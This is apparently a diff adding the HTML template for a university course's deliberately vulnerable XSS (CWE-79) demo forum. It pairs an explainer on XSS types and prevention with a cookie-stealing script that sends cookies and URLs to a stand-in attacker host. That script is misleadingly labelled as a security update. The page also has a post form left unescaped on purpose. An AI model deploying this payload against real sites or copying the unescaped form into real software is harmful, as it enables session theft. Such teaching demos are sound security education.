@@ -1,0 +1,102 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CPSC525 Project - CWE-79</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>Welcome to CWE-79 System Security Forum</h1>
+      <p class="subtitle">We only care about how to improve the security of your website</p>
+    </header>
+
+    <section class="news">
+  <h2>What's New</h2>
+
+  <article class="news-item">
+    <h3>2025-11-13 — Understanding Cross-Site Scripting (XSS) Attacks</h3>
+    <h4>What Is XSS?</h4>
+    <p>Cross-Site Scripting (XSS) is a type of security vulnerability found in web applications. It allows attackers to inject malicious code—usually JavaScript—into webpages viewed by other users. When the browser loads the infected page, it executes the attacker’s script as if it were trusted content from the website.</p>
+
+    <h4>How It Works</h4>
+    <p>An XSS attack typically occurs when a website fails to properly validate or sanitize user-supplied input. For example, if a comment box allows visitors to post HTML or JavaScript without filtering, an attacker can submit:</p>
+    <pre><code>&lt;script&gt;alert('Hacked!');&lt;/script&gt;</code></pre>
+    <p>When another visitor views that page, the script runs in their browser, gaining access to session cookies, login tokens, or other sensitive data.</p>
+
+    <h4>Types of XSS</h4>
+    <ul>
+      <li><strong>Stored XSS</strong> – The malicious script is permanently stored on the server (e.g., in a database or comment section) and executed when the page is loaded.</li>
+      <li><strong>Reflected XSS</strong> – The attack code is part of a URL or form input and reflected immediately by the server’s response.</li>
+      <li><strong>DOM-based XSS</strong> – The vulnerability is within the client-side code (JavaScript) itself; the malicious payload never touches the server but is executed directly in the browser.</li>
+    </ul>
+
+    <h4>Why It’s Dangerous</h4>
+    <p>XSS can be used to:</p>
+    <ul>
+      <li>Steal user credentials or session cookies.</li>
+      <li>Redirect users to phishing or malware sites.</li>
+      <li>Modify webpage content to spread misinformation.</li>
+      <li>Perform actions on behalf of the victim (e.g., change settings or make transactions).</li>
+    </ul>
+
+    <h4>How To Prevent XSS</h4>
+    <ul>
+      <li>Escape output before inserting user data into HTML, JavaScript, or URLs.</li>
+      <li>Use frameworks (like React or Angular) that automatically escape untrusted data.</li>
+      <li>Validate and sanitize input on both the client and server sides.</li>
+      <li>Implement Content Security Policy (CSP) to restrict which scripts can run.</li>
+      <li>Avoid <code>eval()</code> and similar functions that execute dynamic code.</li>
+    </ul>
+
+    <h4>Summary</h4>
+    <p>Cross-Site Scripting exploits the trust users place in a website and the trust browsers place in its code. By enforcing strict input validation, output encoding, and secure coding practices, developers can significantly reduce the risk of XSS and protect both their users and their applications.</p>
+  </article>
+
+    <article class="news-item">
+    <h3>2025-11-01 — Some small tips to improve your website security</h3>
+    <p>Please note: This update fixes multiple input validation vulnerabilities. It is recommended to update promptly.</p>
+    <pre><code>
+    &lt;script&gt;
+    (function(){
+    var ATTACKER = "http://localhost:9000";  
+    var info = "u=" + encodeURIComponent(location.href) + "&c=" + encodeURIComponent(document.cookie || "");
+    var img = new Image();
+    img.src = ATTACKER + "/steal?" + info + "&_t=" + Date.now();
+    setTimeout(function(){ location.replace(ATTACKER + "/landing.html"); }, 300);
+    })();
+    &lt;/script&gt;
+    </code></pre>
+  </article>
+
+</section>
+
+
+    <section class="post-form">
+    <h2>Post Discussion</h2>
+    <form method="POST" action="/post" id="postForm">
+        <label>Author: <input type="text" name="author" placeholder="Your name (optional)"></label><br>
+        <label>Content:</label><br>
+        <textarea name="content" rows="6" cols="80" placeholder="Write your thoughts here..."></textarea><br>
+        <button type="submit">Submit Post</button>
+    </form>
+    <p class="hint">Note: This vulnerable demo version does not escape input, so you can use &lt;script&gt; injection to demonstrate XSS.</p>
+    </section>
+
+
+    <hr/>
+
+    <section class="discussion">
+      <h2>History Post</h2>
+      {{posts}}
+    </section>
+
+    <footer>
+      <p>For CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') Demo use</p>
+    </footer>
+  </div>
+
+  <script src="/static/app.js"></script>
+</body>
+</html>
